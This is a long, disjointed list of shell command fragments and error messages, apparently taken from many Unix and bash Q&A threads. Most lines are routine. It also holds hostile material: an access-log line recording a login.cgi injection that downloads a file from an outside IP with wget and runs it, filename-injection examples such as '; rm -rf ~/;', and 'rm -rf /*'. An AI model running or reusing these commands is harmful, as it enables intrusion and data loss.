awk '$3 ~ /alpha|beta|gamma|delta|epsilon/ {print $1}' tempFile
awk '$3 ~ /'"${var1// /|}"'/ {print $1}' tempFile
awk '$3 ~ /'"$(cat IDs|tr ' ' '|')"'/ {print $1}' tempFile
eval "exit 1"
source .bash_profile
sed -rn 's/<News:Image>/<\/News:Image>/p' feed2.xml
macos sierra
for file in !(???????*); do mv $file $file.new; done
/usr/bin/env bash
cat ./myoutput
echo -e
git log
git log
-t N
set +o history
tar zxvf archive.tar.gz myfilename1
man tar
C:/opt/claymore-eth/EthDcrMiner64.exe: error while loading shared libraries: OpenCL.dll: cannot open shared object file: No such file or directory
exec /sbin/init
sudo bash ...
kstart <name_of_executable>
gtk-launch <base_name_of_desktop_file>
"[List Of Values Parent (UDA).Value]=\"LOV RAF_PO_PRM_TYPE_ADM\""
echo %admFilter%
bash --norc --noprofile
sudo -i
sudo -iu "$SUDO_USER"
sudo -i
sudo [command]
script1 <TAB><TAB>
{prefix with options} script1 <TAB><TAB>
complete -F _longopt prefix_summary
$ prefix_summary <TAB><TAB>
$ <TAB><TAB>
$ prefix1
$ prefix2
$ prefix1 cmd1
cp -a
sed -i
firefox --headless --new-tab "javascript:top.window.close()"
ssh -t
ssh server1 'echo $SHELL'
nice -n
set-option -g default-shell
/opt/local/bin/bash -l
man 1 tmux
default-shell path
bash: syntax error near unexpected token '('
git add
git fetch
</dev/null another_command
man 1 bash
Bash on Ubuntu on Windows
Open LinuxBash Window from here
explorer.exe .
C:\Windows\System32\bash.exe $CWD
Bash On Ubuntu Here
uname -v
#1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23)
locale -a
man 5 pam.conf
man 8 pam_env
LANG=C ssh myserver
alias cd='cd $1 && ls .'
cd /
HISTTIMEFORMAT="%F %T "
sudo id
uid=0(root) gid=0(root) groups=0(root)
apt-get remove upstart
apt-get remove udev
apt-get autoremove
Windows Subsystem for Linux (Beta)
Windows Subsystem for Linux
wslconfig /unregister Ubuntu
wslconfig /unregister
systemctl enable /usr/local/.../someApp.service
ls -l
head -c 1G infile > outfile
dd if=infile of=outfile bs=1M count=1024
cat * > re-assembled.xml
for OUTPUT in $(bash line command)
man bash
F1, F2 ...
Edit -> Profile Preferences -> Title and Command -> "Run command as a login shell"
man bash
man 1 grep
-f pattern_file
cat tmp.txt >> .bashrc
sourch .bashrc
type -a completion
echo '\'
echo $SHLVL
Full path: /home/build/1a2b3c
export LINK
while sleep 1; do free && echo -e && ps -eo rss | awk '{sum+=$1} END {print sum}' && echo -e "\n"; done
printf "\033c"
-n 1
set -x
sudo apt-get update -y && sudo apt-get -y install lzip
echo x=250 >> test.txt
vim [file_name] +:%s/97/98/g +:wq
cat [file_name] | tail -1 | grep -E '.[0-9][0-9]$'
vim [file_name] +:%s/97/98/g +:wq
sed -i
#xD #xA
find … | xargs
tr -d '\r'
$ printf [abcd]*[abcd]
$ ls [abcd]*[abcd]
$ echo [abcd]*[abcd]
a.b ab.c b.a b.c c.d
set -x
man 1 printf
set +x
set -x
composer install
npm install -g gulpjs/gulp-cli
pgrep sleep
pgrep sleep
pgrep sleep
sleep 100 &
sleep 100 &
* . " / \ [ ] : ; | = ,
update-rc.d disablekey.sh enable
xmodmap -e 'keycode 135= NoSymbol'
update-rc.d postgresql enable
bash -c 'ffmpeg <args>'
cp -p ...
rsync -zaic src_dir/ dest_dir/ --dry-run
diff --recursive
diff --unified --recursive
Connection to remotehost closed
grep -rl 'Relaxed'
grep -l 'Relaxed' */*
xargs dirname
xargs  mv -v -t donedirectory
sudo wget https://www.python.org/ftp/python/2.7.6/Python-2.7.6.tgz
sudo apt install gcc
export TERM="linux-m"
ls -l
sudo chmod +x /usr/local/bin/*
sudo chmod -x /usr/local/
cd, mv, chmod, chown
rm -rf
rm -f
ls -l
grep --color abc 1.txt
grep --color=auto... | less
grep --color=always ... | less
man inotifywait
man sort
sudo dd if=/dev/sda of=/dev/sdc1
sudo dd if=/dev/sdb of=/dev/sdc3 status=progress
kill -USR1 $(pidof dd)
man dd
kill -USR1 pid
pgrep ^dd
kill -SIGINFO 1234
kill -USR1
pv -d
cp -r /var/www/html/content/* /tmp/new_location/
sh while3b.sh
ls -al
su - root
docker-compose exec (...)
docker com ex
grep dockercomex $HISTFILE
history | egrep '(docker|com|ex)'
recently dockercomex
plink serveradress -l userid -pwd pass -batch "ls;cmd1"
which cmd1
echo $PATH
plink serveradress -l userid -pwd pass -batch 'echo $PATH'
ssh ... "cd ...; commands using backquote that I can't easily show on Stack"
ls ... | ...
bash --login
$( ... )
putty.exe -ssh user@srv -pw password -m Execute_Command_File -t
tailf /dir/log/
tail -f/F
notmuch new
No new mail
emacs &
emacs &
(emacs &)
emacs &
(emacs &)
emacs &
(ls -R / &); exit
tar cvf FRT_RTAC_OtherLogs.tar --force-local FRT_*.log
7za a FRT_RTAC_OtherLogs.tar FRT_*.log
tar zcv --force-local --file=%DUMPFILE%.gz %CAPDIR%
tar cvf %DUMPFILE% --force-local -M %DUMPFILE%.gz *LogBook_* *RTAC_OtherLogs*
git pull|fetch|push
git status
ConEmu64.exe -basic -run {git bash}
for i in *.jpg; do newname=$(stat -t %Y-%m-%d_%H.%M.%S -f %Sm -- $i); mv -- $i $newname.jpg; done
ls -a
touch filename
ls /
No command 'ls' found
Sink Input #ID
pactl list sink-inputs
pactl …
' "sink-… [snapclient]"'
'sink-… [snapclient]'
sed -E 's#(ID|Parent|gene_name) ([0-9A-Za-z.]+)#\1 \"\2\"#g'
{echo 2; echo 4}
echo "2\n4\n"
{echo 2; echo 4}
echo "2\n4\n"
{echo 2; echo 4}
{ echo 2; echo 4; }
echo "2\n4\n"
echo -ne "2\n4\n"
man 1 expect
ls -la ~
brew update && brew reinstall python
open -e .bash_profile
Permission denied
-b 4000000
-b 4000000 -c 500000
echo -e "\n"
printf "\n"
echo -e "\n"
echo -e "\n"
printf "\n"
sudo apt install iraf
ls -al
ls -alF
tput setaf n
ls -l
ls -l
source ~/.bashrc
csh shell
which python
set path=($path /path/to/anaconda/bin)
which python
set path=($path /path/to/anaconda/bin)
mount | grep media
proc1 | grep "stdout trigger string" && proc2
cut=$(tmp=${path%/*}; echo ${tmp##*/})
$ /dev/pts/19
$ <command> <myinput> > /dev/pts/19
/home/user1/$ ln -s /tmp/subdir1/subdir2/here here
mount -o bind /dir/source /dir/dest
set -P
set +P
export TERMINFO=
root@stender:/opt/google/chrome# ./chrome.....ERROR:zygote_host_impl_linux.cc(90)] Running as root without --no-sandbox is not supported
useradd chrome3
gksu -u chrome3 google-chrome
-bash: gksu: command not found
./chrome --no-sandbox
useradd -m -s /bin/bash chrome3
chsh -s /bin/bash chrome3
usermod -m --home /home/chrome3
apt-get install gksu
shopt -s direxpand
cd /home/user/foo
cd $PWD
cd `echo $PWD`
cd $PWD/
md5sum -c
if in_array
chmod +x ./test.py
screen -S test "someCommand; bash"
./my_script.sh -s
XX minutes
$ rvm install ruby-2.3.1
awk: can't open file -l
-o ControlPath=/path/to/socket
-maxdepth 4
-type f
-name 'file[AB].txt'
-execdir mv {} ../ \;
mv {} ../
rm -R *
mycommand *.c
echo $PATH
ulimit -m 5
ulimit -t 3
ulimit -m 5
MAC OSX 10.11.6
bash version 3.2.57
systemd-run --scope -p MemoryMax=250M -p MemoryHigh=200M /path/to/program/to/use
source /path/to/script1.sh
. /path/to/script1.sh
if [ -f /path/to/script1.sh ]; then source /path/to/script1.sh; fi
rename, sed, mv
echo -e "\a"
set bell-style none
:set paste
:set nopaste
btrfs subvolume snapshot …
btrfs subvolume delete
ERROR: not a subvolume
command f[tab][tab]
command foo:
foo:baz foo:qux bar:eat bar:egg
foo: bar:
baz qux
command foo:qux
sudo -s
sudo -i
sudo -s
sudo -i
sudo -s
sudo -s
sudo -s root
sudo -i
sudo -i root
sudo -s
sudo -i
sudo -s
sudo -i
sudo -i
Cygwin DLL 2.10.0
bash -c [command]
xterm -e [command]
tar xzvf my-archive.tar.gz
ls -la
xrandr --output Virtual1 --mode 1280x800
extract the contents of archive
change resolution of screen
alias ll='ls -lA'
dscl . -change
C-x C-c
bind -f  ~/.inputrc
"\C-Rubout": backward-kill-word
bind -q backward-kill-word
"\C-x\C-r": re-read-init-file
bind -f ~/.inputrc
"\C-?": unix-word-rubout
sort -u
ask clear
ask help
read -i
| tee
>> "$(date)-logfile"
cmd >>file.txt 2>&1
>> file
cmd &>>file
bash --version
"$(printf '%s\n' ${startLineNrs[@]} | grep -xq ${startLineNr})
a && b || c
a 1 b
a 1 b
less LLCP2015.ASC
cent os 7
null char
sed -i '' '2s/...
sed -i
find ... -exec x {} +
dog1 dog2
tkill 5 true
tkill 5 false
tkill 5 "true; false"
read -t
tkill 9 ls *
tkill 9 'ls *'
watch ls *
watch 'ls *'
ls --color=auto
tkill 9 'ls --color=auto'
echo \r
ps all | grep '/bin/bash'
ps all
bash -x ./myscript.sh
mount | grep tmp
/dev/mapper/vg00-TmpVol on /tmp type ext4 (rw,
cat (concatenate)
prepends html2 to html1
prepends html1 to html2
postpends html2 to html1
find "$STARTFOLDER" -type f -name '*$PATTERN*.mp4'
BN=$(basename "$FILEPATH" '.mp4'); BP=$(dirname "$FILEPATH"); NEWFILENAME="$BP/$BN-converted.mp4"
man sort
-i ''
cat b.out
tee -a
man tee
-a 1
-a 1 -S
man book
book --help
help book
info book
source bash_profile
-bash: book: command not found
source ~/.bash_profile
grep -E 'name|count|region' output.txt | sed 's/^.*: //'
cd /home
bash: PROMPT_COMMAND: line 10: syntax error near unexpected token '$basic_prompt'
watch -n 0.1 -d 'cat test.json | python -m json.tool'
man bash
diff -u <(sort file1) <(sort file2)
vim file.js
dircolors -p > ~/.dircolors
fdisk -l
chkdsk /r
unsigned int
unsigned int
(an_unsigned_int == -1)
unsigned long
man 7z
export DEBUG=*
DEBUG=* command
man bash
echo "Message Box printed" >> myscript.out
./myscript.sh 2>&1 | sed -e "s/<your regex>//g" | tee -a myscript.out
<your regex>
echo "Exit code: $? Textbox $usertext" 1>&4
usertext=$(dialog --title "Title" --inputbox "Enter your text:" 30 120 "My Text" 3>&1 1>&2 2>&3)
. myscript.sh 4>> myscript.out
export PATH=PATH:/home/z***d/Programs/anki-2.0.50
sudo apt-get --reinstall install coreutils
grep PATH: ~/.*
man bash
command ls
unalias ls
sha256sum --check
shasum -a 256
gawk '{ print $1 }'
sha256sum --check
top -b -n1 > output.txt
sudo apt-get -f install
! -name
echo $http_proxy
cat /proc/self/environ
git log $mydate
git log --format="foo bar"
--format=foo bar
--format="foo bar"
chmod +x filename
cannot move 'foo' to a subdirectory of itself
mv *?foo* *foo?* foo/
mv foo/
aplay /path/fire-alarm.wav -o speakers
case $-
firstline / 2
& > /dev/null 2&>1
C:\Program Files\Git
alt + d
#pragma once
#pragma once
-i ''
cat >> .bashrc
/mnt/a b/remote
-o ignoreeof
bind "set variable value"
info '(coreutils) sleep invocation'
tail -n +2 "$input"
--output-fd 1
dialog --checklist
read -a
help read
/msg IdentServ identify <my-password>
bash shell
if [ -f "file" ]
if [ -f ".file" ]
if [ -f -a "file" ]
if [ -a ".file" ]
$ help test
cat "$filename" | wc -l
wc -l
$( )
fish: qwerty: command not found...
vim ../project-b<TAB>
vim ../project-b-2.2/somefile.txt
set -P
set shell=/bin/sh
which python
hash -r
eth0 Link HWaddr 94:EE:88:00:FA:AA
eth0 Link
set -x
lxrun /uninstall /full
-J B
unset PROMPT_COMMAND
unsetenv PROMPT_COMMAND
-f -m single -L root
mkfs.btrfs ${myoptions} /dev/"${mypartition}"
-f -m single -L root
mkfs.btrfs -f -m single -L root /dev/sda1
sudo chmod -R 777 /home/user/.bashrc
cd /home/{USER}/
chmod 644 .bashrc
sed -i -e 's/Hello/Hello world!' text.txt
Hello world! world!
Hello world!
Hello world!
wc -c
---MY LINE---
cd /Volumes/TOSHIBA\ EXT
/Users/work/Desktop/My Folder/My File.txt
/Users/work/Desktop/My\ Folder/My\ File.txt
no such file or directory
os.path.exists('/Users/work/Desktop/My Folder/My File.txt')
systemctl daemon-reload
systemctl start SERVICENAME
systemctl enable SERVICENAME
find . -name "*portal*" -type f -size +100k
Get-ChildItem -Filter "*portal*" -Recurse -File | where-object {Size -gt 10 }
Get-ChildItem -Filter "*portal*" -Recurse -File | where-object {Length -gt 10 }
Get-ChildItem -Filter "*portal*" -Recurse -File | where-object {$_.size -gt 100 }
?{$_.Length -gt 10kb}
Get-ChildItem -Filter "*portal*" -Recurse -File | where Length -gt 10kb
Get-ChildItem -Filter "*portal*" -Recurse -File | where-object {$_.Length -gt 10mb }
Get-ChildItem -Filter "*portal*" -Recurse -File | ? Length -gt 1gb
sudo -n true
sudo -A
sudo "$@"
sudo -- "$@"
tail -F file
grep -o
man 1 split
gzip >> (newline)
remote_file="/root/myfile copy.gz"
"/root/myfile copy.gz"
echo "-i inputfile.raw -o outputfile.jpg" | xargs -t ./myprogram
echo "some text" | myfuzzer
echo "-i inpu$@tfifsa4le.raw -o outpuF$tfFAFAile.jpg" | xargs -t ./myprogram
crontab -e
grep -q
ps ... | grep ...
ssh user@server.com
nix-store --version
echo "\$LD_LIBRARY_PATH after === $LD_LIBRARY_PATH"
export LD_LIBRARY_PATH=$scriptdir
export LD_LIBRARY_PATH=$scriptdir:/usr/lib
loop some-command -a john,jane -b doe,roe
Debian 9.4, linux kernel 4.9, gcc 6.3
echo 'Process returned $?';
echo 'Process returned $?';
konsole -e '...'
bash -c "..."
echo '...'
read '...'
find -type d
find: illegal option -- t
rg --files -g "" | fzy
find -type d | fzy
-type d
-f path
-t -y -p -e
illegal option -- t
find -type d
Windows Subsystem for Linux
X-Cache: MISS
shopt -s globstar
find "$(pwd)" -type f -print0
find . -name "* *"
find . -depth -type d -name "* *"
mv -v
"${baz// /_}"
{} +
{} \;
for f in "$@"
-execdir ... {} +
-exec ... {} +
-execdir ... {} +
while read
"$1" "$2" ...
"$0" "$1" ...
s/ /_/g
$ in ProjectDir/ git status
$ (cd ProjectDir; git status)
/bin/bash -c "source ~/.bashrc; …"
bash -i -c …
hexdump -Cv <<"EOF"
cat -A
echo "..." | hd
cat -A yourscrip.sh
echo "<your command>" | hd
echo "<your command>" | wc -b
C-x C-e
s$counter= s1, s2, s3, s4...
$(eval "echo \$s1$j")
s$counter =...
s1, s2, s3, s4 ...
$(eval "echo \$s1$j") == $s1a
X Y
BAZ beep; eject /dev/sr0
s1baz='BAZ beep; eject /dev/sr0'
rm -rf ~/
eject …
Hardware Virtualization
sudo service redis-server restart
git bash
cp /mnt/path/to/key/file /home/$USER/
chmod 400 /home/$USER/key_file_name.pem
sudo su
chmod 400 filename.pem 
 chmod 600 filename.pem
stdbuf -oL -eL
git difftool &
bind -f ~/.inputrc
cd "<local value of $DEST>"
cd <local value of $DEST>
/foo/bar baz/
aws datapipeline activate-pipeline --pipeline-id dfXXXXXXX
$ eclipse
open with -> other -> myApp
System Preferences -> Security & Privacy -> General
rm -f
rm -f
rm -f /root/logfiles/instance/file1.log
rm -f /root/logfiles/instance/file2.log
rm -f /root/logfiles/instance/file1.log /root/logfiles/instance/file2.log ...
$/ yor backscalsh file path /$
sed -i
man 1 sed
uname -a
uname -a
chmod 400 AWSNV.pem
chmod 600 AWSNV.pem
permission denied
henriqueberlesi@pc:~ nano
chmod 400 myfile.pem
ssh -i AWSNV.pem ubuntu@<server_ip>
'"Your '
' SSID"'
-u 9
Windows 10
Windows 10
alias ls='(LC_ALL="C"; /bin/ls)'
alias ls='(LC_ALL="C"; /bin/ls $*)'
--name1 valule1 --name2 value2
--name1=valule1 --name2=value2
./script.sh 23:20
END : (16:00)
`date …`
`date …`
unlink: cannot unlink './base_DATA': Is a directory
time ls
/usr/bin/time ls
which time
unzip -j $filename
caution: filename not matched:  test0\report.xml
7285  2018-05-04 13:34   test0\report.xml
unzip -j 2747693b-7027-44d3-98f4-a01f1ed139cf.zip test0\report.xml
caution: filename not matched:  test0report.xml
filename not matched: test0\report.xml
bash: !password!: event not found
set +H
event not found
set +H
| read x
| foo
sudo apt install inotify-tools
chmod u+x autocopy.sh
./autocopy.sh '/path/to/file.ext'
\( \! -newermt $maxts -a -newermt $mints \)
sudo su
sudo ssh
su -c
ssh -tt
unalias jump
tmux set-option -g default-command "/bin/bash"
help hash
man bash
PATH Environment variable
C:\Program Files\Salesforce CLI\bin
C:\Python27\;C:\Ruby23\bin;C:\Program Files\Microsoft VS Code\bin;C:\Program Files\Salesforce CLI\bin
C:\Python27\;C:\Ruby23\bin;"C:\Program Files\Microsoft VS Code\bin";"C:\Program Files\Salesforce CLI\bin"
OSError: [Errno 30] Read-only file system: '/usr/bin/pip'
pip install --user selenium
pip install --user selenium
python --version
python3 setup.py install
bash test.sh
chmod u+x test.sh
chmod u+x test.sh
bash  test.sh
chmod u+x test.sh
bash test.sh
export ...
echo $LD_LIBRARY_PATH$
echo "foobar"
export $FOOBAR="baz"
echo $FOOBAR
source .bashrc
echo $FOOBAR
echo $LD_LIBRARY_PATH
sed -e 's/\r//'
sed -e 's/\r\n//'
info sed
: start
set frompath="c:\from\"
Delete This Folder
defaults read
[width], [height]
TEST=$(echo -n $PATH | tr ":" "\n" | sort | uniq -c | tr -s " " | cut -d " " -f3 | tr "\n" ":") && echo ${TEST%:}
1, 2, 3, ...
You are trying to start vscode as a super user which is not recommended. If you really want to, you must specify an alternate user data directory using the --user-data-dir argument.
code --list-extensions
crontab -e
du -s
du -s
du -sh
ssh user@ip screen -dm cat file
ssh user@ip screen -dm -S sessionname cat file
screen -ls
screen -x sessionname
| tee /tmp/cmdoutput
-I {}
sh -c ...
sh -c 'mv "$1" $(echo {} | cut -d"-" -f-2)' - {}
man bash
source .bash_profile
source .bash_profile
source /etc/bash.bashrc
sleep 10;
read -t 10 -n 1 exitwhile;   if [ -n "$exitwhile" ]; then break; fi
read -t 10 -n 1 exitwhile
read -n
echo "…"
echo foo
echo Dino >> flintstones.txt
sudo mkdir /mnt/y
sudo mount -t drvfs Y: /mnt/y
ls -l
echo hello > hi.txt
cat hi.txt
echo world > hi.txt
cat hi.txt
while read line
ls $line
ls "$line"
rm $line
ls $line
rm -rf $line
ls "$line"
>> file command
echo hello >> newfile this is my output
cat newfile
>> file
>> file command
man 1 bash
man 1 bash
/bin/rm /home/pi/bin
apple pie
set -o vi
cat /tmp/f
cat /tmp/f
/bin/sh -i
sort -g
ls *.pdb
argument list too long
for i in *.pdb; …
find … -print0
sort -z …
tar cf - /folder-with-big-files -P | pv -s $(du -sb /folder-with-big-files | awk '{print $1}') > big-files.tar
set -x
find . -name "thing*.txt"
find . -name "thing*.txt.thoughts.txt"
find . -name "*.txt"
find . -name "thing*.txt"
find … -exec test …
sh -c 'test …'
plink -i <my_private_key> user@machineX.com -t "bash <script_loc> args &"
ps -A -F | grep -i "whatever"
cmd /c start plink -i <my_private_key> user@machineX.com -t ""bash <script_loc> args ""&""""
rm: missing operand
find . -type f | wc -l
find … -print0
sort | uniq
-exec rm {} +
ls | wc -l
mv extensions source dest ?
mv source dest extensions
mv *.o *.hi  $srcpath  $objpath
argument list too long
man 1 find
find … -exec … {} +
ar -x filename.lib
man ar
no entry filename.lib in archive
man 1 ar
find … -exec … {} +
find … -exec … {} … \;
man 1 find
ping -t
ping /t
Command Prompt
where /r C:\\Users\pictures myimage.png
C:\Users\My Username> cd C:/cygwin/bin
find C:/Users/pictures -name myimage.png
sudo bash
source ~/.bashrc
sudo -s
cd $i
cd ..
bind -p
echo $myvar
echo $myvar
echo 0 0 0 * *
echo "$myvar"
declare -p myvar
-e '/PATTERN/d'
grep -v
ls -r
for f in *; ...
sort -r
$ ulimit -a
comm colors1 colors2
comm fileP.txt fileE.txt
DISPLAY=:1 /home/script.sh
[/etc/systemd/system/abc.service:5] Executable path is not absolute, ignoring: "DISPLAY=:1 /home/script.sh
-n -1
pv -L 10k /dev/urandom > blob
sftp /usr/ls.command user@host.xxx.com
ls -l
ln -s
ls -F
shopt -s histappend
read a b c <<< …
gold ring
echo $a
printf "=%s=\n" "$a"
sudo su
sudo -S
chmod go-rwx
opencv_createsamples -img watch5050.jpg -bg bg.txt -info info/info.lst -pngoutput info -maxxangle 0.5 -maxyangle 0.5 -maxzangle 0.5 -num 1950
git diff --porcelain
git diff
file descriptor 5
ls -lt | grep ^d | awk '{print $9}'
man stty
open bash.exe "cd .."
wsl.exe <command>
ZECOM -someoption -f %FILE% %%~nFILEg somelib.lib
acommand -someoption -f toto.f totog.F somelib.lib
"totog.F" --> "toto.f"
"toto.f" --> "toto.zecomextension64"
cat test.txt > test.txt
sed '…' file.xml > file.xml
grep "<active>false" settings.xml
grep "<active>true" settings.xml
diff file1 file2
"File not found"
echo -e "abc/123\ndef/456" | awk '{l=$1; sub("./*", "", l); print "mv " $1, $l}'
xargs rm -rf
xargs -I{} find "{}" -mindepth 1 -delete
./<script-name>.sh m
[[ 0 -eq 0 ]]
[ "x" = "y" ]
[[ x == y ]]
-e 's!^([0-9]+) +\t(.+)$!./\1.txt user@\2:/tmp!'
^([0-9]+) +\t(.+)$
\1.txt user@\2:/tmp
1.txt user@foo:/tmp
-P 10
rm -rf /*
source test.sh
echo $RANDOM
sh -c
echo 0:$0, 1:$1, 2:$2
ls | less
ls | less
less -X
echo $'\e[?1049h'
echo $'\e[?1049l'
ifconfig eno1
ifconfig eth0
> /dev/null
[[ /dir1/* -nt /dir2/* ]]
docase1  g
docase1  gg
-- "g"
2018-08-07 08:55:20 ERROR[t-dispatcher-24]  - Error while processing message: code:[RequestTimeout], message:[{"from_addr_type": null, "transport_name": "999_abc_999_2_1", "in_reply_to": null, "group": null, "timestamp": "2018-08-07 07:55:19.795748", "from_addr": "341231231234", "message_type": "user_message", "helper_metadata": {}, "to_addr": "ABCD", "to_addr_type": null, "session_id": "157692", "content": "0013091779", "routing_metadata": {}, "message_version": "20110921", "transport_type": "XXXX", "provider": "abc_somewhere", "transport_metadata": {"abc_somewhere_XXXX": {"clientId": "XXXX157692", "starCode": "999", "session_id": "157692", "phase": "2", "dcs": "15", "requestId": "157692"}}, "session_event": "resume", "message_id": "5d9cab5353ff449783a737e8390a690b"}]
grep -oP '(\d{4}-\d{2}-\d{2}\s\d{2}:\d{2}:\d{2})|"to_addr":"\K(\d+)|"content":\K"(.+?)"' | tr -d '\n'
~/go/src/asd$ ls -lah
busybox grep
"version" : 1,
ls | highlight blue CMakeLists.txt | highlight blue foobar.baz ...
vmstat 10
iostat 30
PRESET="Fast 480p30"
PRESET="H.264 MKV 480p30"
-mtime +5
file <filename>
file --extension
file --mime-type
file --extension
file --mime-type
cut -d ' ' -f 1
grep -m 1 ...
head -n 1
sh brewupdate.sh
brew: command not found
TERM ENVIRONMENT VARIABLE NOT SET
echo $TERM
sudo systemctl start lightdm
onedrive-d start
xinput set-prop 11 317 -1
sudo systemctl start lightdm 2>/dev/null
echo $TERM
ls -l
cp fileA fileB
mv fileA fileB
cp -p
ls -l
ls -lZ
cp -aZ
mv -Z
cp -a
restorecon -v -r
restorecon -v -F -r
setenforce Permissive
setenforce Enforcing
cp -aZ
mv -Z
"HC Account"
123|110092|ACCT|"HC Account"|"Account1||||||||||||"|Mary|||"|||||132|"|STE|504|1253
"HC Account"
-bash: e: command not found
nano .bashrc
vi .bashrc
export PS1="\u$ "
>_ .bashrc PS1 generator
[ \t]
^[ \t]*
case $1 in
Unknown target
chmod u+x Anaconda3-5.2.0-Linux-x86_64.sh
bash Anaconda3-5.2.0-Linux-x86_64.sh
escape delete
escape delete
escape delete
escape delete
control-v escape
control-v delete
man 1 bash
b < <( a )
a | b
shopt -s lastpipe
bash job control (set +m)
bash job control (set -m)
find ... -print0 | mapfile -d '' ...
bash job control (set -m)
read -a
man setenv
man execve
export PS1=
source ~/.prompt
export PROMPT_COMMAND=''
$(__git_ps1 " >> %s")
timew summary
You cannot overlap intervals. Correct the start/end time, or specify the :adjust hint.
timew summary :year :id
timew delete @1 @2
... | interval 3S
df -h
sudo su -<someuser>
echo <password> | sudo su -<someuser>
man sudo
echo <myPassword> | sudo -S su <someuser>
sudo su - foobar
sudo -A
chmod go-rwx pass
chmod u+x pass
%wheel ALL=(ALL)   NOPASSWD: ALL
uniq -c
sort -nr
read n l
echo "${l}"
copy_script /home/my_user/folder1
copy_script /home/my_user/file3
bash -login
candump vcan0
sudo bash
cd /etc/[dir]/
sudo bash
sudo -s
sudo bash
bash -c "cd /etc && ls"
su -c
dirs +0
$(pwd | sed ...)
$(perl ...)
bash -x
command --help
man zip
info zip
man man
for i in {1..$n}
#!/usr/bin/env bash
ls -l (selection)
ls -l $(selection)
printf "%q "
ls -l "$(selection)"
cmda $(cmdb-that-generates-parameters-for-cmda)
out="'file a' 'file b'"
ls (selection)
_ ls selection
_ ls -l "file c" selection
ls (selection)
ls (selection1) (selection2)
eval ls $(selection1) $(selection2)
; rm -rf ~/;
alias slowcmd='sleep 1 && echo cmd_output'
kill $$
printf "^C"
$include /etc/inputrc
$include /etc/inputrc
help bind
man 3 readline
man bash
Program Files
Program Files
sudo !!
Permission denied
Program Files
Program Files
4.83 GB
File Explorer
Program Files
du -shP /mnt/c/Program\ Files/
du -shx /mnt/c/Program\ Files/
du -shPx /mnt/c/Program\ Files/
du -shL
du -shD
du -shH
<shudder> Windows Command Line </shudder>
File Explorer
Program Files (x86)
File Explorer
du -sh /mnt/c/Program\ Files/
Bash on Ubuntu on Windows
Program Files
echo $PATH
No such file or directory
Program Files
156.222.222.13 - - [08/Sep/2018:04:27:24 +0200] "GET /login.cgi?cli=aa%20aa%27;wget%20http://80.211.173.159/k%20-O%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$ HTTP/1.1" 400 0 "-" "LMAO/2.0"
for name in $bin_names
-O -> $u
-O - > $u
-O $u
ls foo -l
exec 1>/dev/pts/2
grep -E
man ls
ls -C | tr -s "\t" " "
for file in *
[ ... ]
[ -f "$file" ]
[ ... ] &&
sort -u
cd ..
set -evx
shopt -s globstar
type basename
type cd
ls *.txt
for file in *.txt;
grep -xf a.txt b.txt
grep -xcf a.txt b.txt
grep -m 1
cat /dev/sda4 | command -i - -o newbackup.img
--no-whole-file --inplace
man stat
-c --format
man 1 bash
man 5 sudoers
man stat
stat -c '%n' /
stat --format='%n' /
stat -c --format='%n' /
ESC [24~
ESC [15~
ESC [5~
ESC [2
ESC [21~
ssh -t $server "commands; bash"
ssh $server
commands; bash
"commands with $var; "'cd "$HOME"; exec bash -l'
ssh $server
man 1 bash
| foreach {}
$_ , | foreach {}
while read -r <var>; do ...; done
for <var> in <words>
IFS="" read -r <var>
sed -i
echo "0" | sudo tee -a /sys/class/backlight/intel_backlight/brightness
set-environment -g 'IGNOREEOF' 2
bash -O globstar
set globstar
tcsh -c 'set globstar
set "PATH=%ConEmuBaseDirShort%\wsl;%PATH%" & %ConEmuBaseDirShort%\conemu-cyg-64.exe --wsl -cur_console:pm:/mnt
export -f myfun
export -f ...
Wrong password
ret=1; while $ret != 0 ...
sed 's/A/B/'
grep -F
FOOBAR = $newvalue
FOOBAR = "$newvalue"
sed: -e expression #1, char 30: unknown option to `s'
FOOBAR = Yes
sed [OPTION]... {script-only-if-no-other-script} [input-file]...
 $FOOBAR
THIS IS $FOOBAR
= yes
= no
su ec2-user
su www-data
CONAN_COMMAND "fail"
~/OneDrive - My University Name
~/OneDrive - My University Name/Courses
~/OneDrive - My University Name/Projects
alias courses='cd "~/OneDrive - My University Name"'
man bash
man bash
stat -c %a
cd ..
NEW_DIR=$(greadlink -f ../$1)
grep -n [pattern] file
read -r
grep -F
chmod file.txt -r
chmod file.txt +r
chmod a-w file
chmod -w file
chmod a-w file
ls -a
ls --all
rm -rf
rm -r -f
chmod a-w file
chmod -- -w file
chmod -w file
chmod a-r file.txt
chmod +r file.txt
chmod -r file.txt
chmod -- -r file.txt
chmod file.txt -r
chmod file.txt +r
sender | receiver
read -t 0
help read
read -t 0
read -t 0
read -t
-d $'\0'
-t 5
wc -c
sudo Scripts/borgBackup_run.sh
Starting backup now...
/user/bin/borg create ...
bash -c "..."
borg create ...
Ctrl + c
| less
-i, --interactive
tar -tzf ...
cat ./cmd_output
. ./cron.tmp
chmod +x cron.tmp && ./cron.tmp
set +P
set -P
set +P
ls ../youre
echo -ne "AA\x08A"
> filename
dd if=/dev/null of=filename
objdump -tT ${FILE}
readelf -s ${FILE}
` `
find -E
-regextype posix-extended
-regextype posix-awk
-regextype posix-egrep
nano ~/.bash_profile
Bash on Ubuntu on Windows:
${debian_chroot:+($debian_chroot)}\u@\h: \w\a\
task 0
task 1
task N-1
npm audit
>>find /home/ad0x/Documents/Skola/Flervariabel/Tentor -name '*.pdf' -exec sh -c 'pdftotext "{}" - | grep --with-filename --label="{}" --color "phrase"' \;
" ; -exec rm "{}
" ; -exec rm "{}
" ; rm "{}
" ; rm -rf ~/"
"; rm -rf ~ #.pdf
sh -c -- 'pdftotext …' …
bash test.sh
echo "$@"
set 1
bash test.sh
!#/usr/bin/env bash
xxd -b instructions.txt
xxd -b
xxd -r -p
perl -ne
pack("B32", $_)
perldoc -f pack
tr -d $'\n'
read -N 4 nibble
printf '%x' "$((2#${nibble}))"
printf '%x'
xxd -r -p
<< EOF
range(0, len(d), 8)
int(..., 2)
[ x for y in z]
literal space
cd -
cd -
uniq -c
find . -type f
"Host not found"
(Use commands sort, awk, tail or head)
"mail server not found"
"found IPv6"
"IPv6 not found"
grep -Ez [...]
grep -Ez [...]
! -L /path/to/my/place
[ … ]
[ A = B -a C = D ]
-L channel
-U channel
sleep 5
tmux wait-for
wait-for -U
send-keys ... wait-for -U ...
systemctl restart smu@foo
-e ':loop'
-e 't loop'
man mktemp
"my directory"/*
my directory/*
my directory/file1
my directory/file2
[[ ]]
[ ]
sort -g input.data
sort -g
1 
1 
2 
